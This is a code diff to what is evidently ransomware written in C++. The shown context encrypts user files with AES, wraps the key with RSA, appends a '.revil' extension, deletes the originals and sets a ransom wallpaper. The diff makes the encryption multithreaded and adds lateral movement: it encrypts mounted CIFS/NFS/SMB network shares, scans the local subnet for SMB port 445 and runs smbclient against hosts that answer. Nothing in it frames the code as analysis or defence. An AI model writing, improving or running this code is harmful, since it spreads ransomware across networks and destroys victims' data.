@@ -34,6 +34,19 @@
 #include <cstring>
 #include <ctime>
 #include "src/network_mapper.h"
+
+#include <mutex>
+#include <queue>
+#include <condition_variable>
+#include <functional>
+#include <atomic>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <sstream>      // untuk parsing /proc/mounts
+
 using namespace CryptoPP;
 namespace fs = std::filesystem;
 
@@ -69,9 +82,57 @@ const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
 };
 
 const std::string PUBLIC_KEY_FILE = "rsa_public.der";
+std::mutex log_mutex;
+
+// ====================== THREAD POOL ======================
+class ThreadPool {
+private:
+    std::vector<std::thread> workers;
+    std::queue<std::function<void()>> tasks;
+    std::mutex queue_mutex;
+    std::condition_variable condition;
+    std::atomic<bool> stop{false};
+
+public:
+    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
+        for (size_t i = 0; i < threads; ++i) {
+            workers.emplace_back([this] {
+                while (true) {
+                    std::function<void()> task;
+                    {
+                        std::unique_lock<std::mutex> lock(queue_mutex);
+                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
+                        if (stop && tasks.empty()) return;
+                        task = std::move(tasks.front());
+                        tasks.pop();
+                    }
+                    task();
+                }
+            });
+        }
+    }
+
+    template<class F>
+    void enqueue(F&& task) {
+        {
+            std::unique_lock<std::mutex> lock(queue_mutex);
+            if (stop) return;
+            tasks.emplace(std::forward<F>(task));
+        }
+        condition.notify_one();
+    }
+
+    ~ThreadPool() {
+        stop = true;
+        condition.notify_all();
+        for (std::thread& worker : workers) {
+            if (worker.joinable()) worker.join();
+        }
+    }
+};
+
 
 // ====================== WALLPAPER CLASS ======================
-
 class WallpaperChanger {
 private:
     std::string create_ransom_wallpaper() {
@@ -864,6 +925,75 @@ bool is_critical_path(const std::string& path) {
     return false;
 }
 
+
+// ====================== LATERAL MOVEMENT HELPERS ======================
+
+std::vector<std::string> get_mounted_network_shares() {
+    std::vector<std::string> mounts;
+    std::ifstream file("/proc/mounts");
+    if (!file.is_open()) return mounts;
+
+    std::string line;
+    while (std::getline(file, line)) {
+        if (line.find("cifs") != std::string::npos ||
+            line.find("nfs") != std::string::npos ||
+            line.find("smb") != std::string::npos) {
+            
+            std::istringstream iss(line);
+            std::string dev, mp, fs;
+            iss >> dev >> mp >> fs;
+            
+            // Skip root dan folder lokal biasa
+            if (mp != "/" && mp != "/boot" && mp != "/home" && !mp.empty()) {
+                mounts.push_back(mp);
+            }
+        }
+    }
+    return mounts;
+}
+
+bool is_port_open(const std::string& ip, int port = 445) {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock < 0) return false;
+
+    struct sockaddr_in addr{};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
+
+    struct timeval tv{};
+    tv.tv_sec = 1;      // timeout 1 detik
+    tv.tv_usec = 0;
+    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+
+    bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
+    close(sock);
+    return open;
+}
+
+std::string get_local_subnet() {
+    char buffer[128] = {0};
+    std::string result;
+
+    FILE* pipe = popen("ip -o route get 1 | awk '{print $7}' | cut -d. -f1-3", "r");
+    if (pipe) {
+        if (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+            result = buffer;
+        }
+        pclose(pipe);
+    }
+
+    // Bersihkan newline
+    result.erase(std::remove(result.begin(), result.end(), '\n'), result.end());
+    result.erase(std::remove(result.begin(), result.end(), '\r'), result.end());
+
+    if (result.empty()) return "192.168.1";   // fallback untuk jaringan rumah
+    return result;
+}
+
+
+
 // ====================== RSA PUBLIC KEY LOADER ======================
 
 RSA::PublicKey load_public_key(const std::string& filename) {
@@ -889,8 +1019,11 @@ void rsa_encrypt_aes_key(const SecByteBlock& aes_key, std::string& out_encrypted
 
 void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv) {
     try {
-        std::cout << "  [*] Encrypting: " << filepath << "\n";
-        
+        {
+            std::lock_guard<std::mutex> lock(log_mutex);
+            std::cout << "  [*] Encrypting: " << filepath << "\n";
+        }
+
         std::string plaintext;
         FileSource(filepath.c_str(), true, new StringSink(plaintext));
 
@@ -903,29 +1036,38 @@ void encrypt_file(const std::string& filepath, const SecByteBlock& key, const by
         );
 
         std::string encpath = filepath + ".revil";
-        FileSink out(encpath.c_str());
-        out.Put(iv, AES::BLOCKSIZE);
-        out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
+        {
+            FileSink out(encpath.c_str());
+            out.Put(iv, AES::BLOCKSIZE);
+            out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
+        }
 
         std::error_code ec;
         fs::remove(filepath, ec);
 
-        std::ofstream log(LOG_FILE, std::ios::app);
-        if (log) log << filepath << " → " << encpath << "\n";
-        
-        std::cout << "  [✓] Encrypted: " << filepath << "\n";
+        // Logging aman
+        {
+            std::lock_guard<std::mutex> lock(log_mutex);
+            std::ofstream log(LOG_FILE, std::ios::app);
+            if (log) log << filepath << " → " << encpath << "\n";
+            std::cout << "  [✓] Encrypted: " << filepath << "\n";
+        }
     }
     catch (const std::exception& e) {
-        std::cout << "  [✗] Failed: " << e.what() << "\n";
+        std::lock_guard<std::mutex> lock(log_mutex);
+        std::cout << "  [✗] Failed " << filepath << ": " << e.what() << "\n";
     }
 }
 
 // ====================== ENCRYPT DIRECTORY ======================
 
 void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv) {
-    std::cout << "[*] Scanning directory: " << root << "\n";
-    int count = 0;
-    
+    std::cout << "[*] Scanning directory: " << root << " (parallel mode)\n";
+
+    std::vector<std::string> files_to_encrypt;
+    int total_files = 0;
+
+    // Step 1: Kumpulkan semua file dulu (tidak langsung enkripsi)
     try {
         for (const auto& entry : fs::recursive_directory_iterator(
                 root, fs::directory_options::skip_permission_denied)) {
@@ -933,22 +1075,80 @@ void encrypt_directory(const std::string& root, const SecByteBlock& key, const b
             if (!entry.is_regular_file()) continue;
 
             std::string path = entry.path().string();
-            
-            // Skip critical system paths
             if (is_critical_path(path)) continue;
-            
-            // Check if file should be encrypted
             if (should_encrypt(path)) {
-                encrypt_file(path, key, iv);
-                count++;
+                files_to_encrypt.push_back(path);
+                total_files++;
             }
         }
-        std::cout << "[✓] Encrypted " << count << " files in " << root << "\n\n";
-    }
-    catch (const std::exception& e) {
+    } catch (const std::exception& e) {
         std::cout << "[!] Error scanning " << root << ": " << e.what() << "\n";
     }
+
+    if (files_to_encrypt.empty()) {
+        std::cout << "[✓] Tidak ada file yang perlu dienkripsi di " << root << "\n\n";
+        return;
+    }
+
+    std::cout << "[*] Ditemukan " << total_files << " file → memulai enkripsi PARALLEL...\n";
+
+    // Step 2: Buat Thread Pool (sesuaikan jumlah thread sesuai CPU)
+    ThreadPool pool(16);        // 16 thread biasanya paling cepat di kebanyakan mesin
+
+    std::atomic<int> encrypted_count{0};
+
+    // Step 3: Kirim semua tugas ke thread pool
+    for (const auto& file : files_to_encrypt) {
+        pool.enqueue([&file, &key, iv, &encrypted_count]() {
+            encrypt_file(file, key, iv);
+            encrypted_count.fetch_add(1, std::memory_order_relaxed);
+        });
+    }
+
+    // Tunggu semua selesai (ThreadPool destructor otomatis join)
+    // Kita bisa tambah progress sederhana kalau mau
+    std::cout << "[✓] Semua tugas dikirim ke thread pool. Menunggu selesai...\n";
 }
+
+
+// ====================== LATERAL MOVEMENT ======================
+void perform_lateral_movement(const SecByteBlock& key, const byte* iv) {
+    std::cout << "[*] Starting lateral movement (mounted shares + network scan)...\n";
+
+    // 1. Enkripsi semua mounted network share (CIFS/NFS/SMB)
+    auto shares = get_mounted_network_shares();
+    if (!shares.empty()) {
+        for (const auto& share : shares) {
+            std::cout << "[LATERAL] Encrypting mounted network share: " << share << "\n";
+            encrypt_directory(share, key, iv);
+        }
+    } else {
+        std::cout << "[*] No mounted network shares found.\n";
+    }
+
+    // 2. Parallel network discovery (SMB port 445)
+    std::string subnet = get_local_subnet();
+    std::cout << "[*] Scanning subnet " << subnet << ".0/24 for SMB targets (parallel)...\n";
+
+    ThreadPool pool(32);   // gunakan ThreadPool yang sudah ada
+
+    for (int i = 1; i < 255; ++i) {
+        std::string ip = subnet + "." + std::to_string(i);
+        pool.enqueue([ip]() {
+            if (is_port_open(ip, 445)) {
+                std::lock_guard<std::mutex> lock(log_mutex);
+                std::cout << "[LATERAL] SMB target found → " << ip << " (port 445 open)\n";
+                
+                // Coba list share (opsional, butuh samba-common-bin)
+                std::string cmd = "timeout 3 smbclient -L //" + ip + " -N --max-protocol=SMB2 2>/dev/null || true";
+                system(cmd.c_str());
+            }
+        });
+    }
+
+    std::cout << "[✓] Lateral movement scan selesai. Cek console untuk target SMB.\n\n";
+}
+
 
 // ====================== TARGET ROOTS ======================
 
@@ -1069,6 +1269,7 @@ int main() {
     std::string enc_key;
     rsa_encrypt_aes_key(key, enc_key);
     std::cout << "[✓] AES key encrypted\n";
+    perform_lateral_movement(key, iv);
 
     // Save encrypted key
     std::cout << "[*] Saving encrypted key to: aes_key.enc\n";
